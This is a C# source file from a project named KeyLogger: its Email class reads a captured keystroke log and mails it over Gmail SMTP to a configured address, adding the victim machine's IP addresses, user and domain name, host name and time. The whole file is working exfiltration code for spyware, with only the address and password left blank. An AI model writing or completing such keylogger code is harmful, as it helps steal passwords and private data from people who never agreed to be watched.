using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    public class Email
    {
        static string emailAddress;
        static SmtpClient client;

        static Email()
        {
            emailAddress = "";
            client = new SmtpClient("smtp.gmail.com", 587)
            {
                Credentials = new System.Net.NetworkCredential(emailAddress, ""),
                UseDefaultCredentials = false,
                EnableSsl = true,
            };
        }

        public static void SendNewMessage(string filePath)
        {
            try
            {
                // send the content of the text file to an external email address
                String logContent = File.ReadAllText(filePath);
                MailMessage emailMessage = GenerateEmail(logContent);
                client.Send(emailMessage);
                Console.WriteLine("Email has been send successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in sharing log with email: {ex.Message}");
            }
        }

        private static MailMessage GenerateEmail(string content)
        {
            DateTime now = DateTime.Now;
            string emailBody = "";
            string subject = "Message from keyLogger - " + now.ToString();

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "\nAddress: " + address;
            }
            emailBody += "\nUser: " + Environment.UserDomainName + "\\ " + Environment.UserName;
            emailBody += "\nHost: " + host;
            emailBody += "\nTime: " + now.ToString();
            emailBody += "\n\n" + content;

            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress(emailAddress);
            mailMessage.To.Add(emailAddress);
            mailMessage.Subject = subject;
            mailMessage.Body = emailBody;
            return mailMessage;
        }
    }
}
